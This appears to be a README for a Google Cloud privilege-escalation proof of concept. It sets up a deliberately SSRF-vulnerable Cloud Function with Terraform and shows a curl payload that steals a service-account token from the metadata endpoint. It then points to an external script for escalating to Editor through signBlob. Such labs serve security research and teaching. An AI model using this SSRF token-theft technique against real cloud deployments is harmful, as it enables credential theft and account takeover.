# PrivEsc PoC for iam.serviceAccounts.signBlob method for signing URLs

## Setup
1. Install [Terraform](https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli) and [gcloud CLI](https://cloud.google.com/sdk/docs/install).
2. Create [a new project](https://cloud.google.com/resource-manager/docs/creating-managing-projects#creating_a_project) in Google Cloud environment and copy its ID.
3. Login into `gcloud` with your main GCP user.
```bash
gcloud auth application-default login
```
4. Setup a vulnerable to SSRF Cloud Function with help of Terrafrom scripts. 
```bash
git clone https://github.com/Horlad/signBlob_PrivEsc_PoC.git
cd signBlob_PrivEsc_PoC/terraform
terrafrom init -upgrade
terrafrom apply --var gcp_project_id=YOUR_GCP_PROJECT_ID
```

## Exploitation
1. In Terraform output you can locate a URL to the vulnerable Cloud Function. Exploit SSRF to obtain a temporary token of an attached service account which use `iam.serviceAccounts.signBlob` permission to sign URLs.
```
curl https://YOUR.CLOUD.FUNCTION.URl?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/token&auth=Metadata-Flavor:%20Google
```
2. The  Terraform output you can also find `App Engine` and `Compute Engine ` default service accounts which were created automatically during the Cloud Function creation without explicit creation. You can use them to escalate to `Editor` role via [the Rhinosecurity exploit](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py).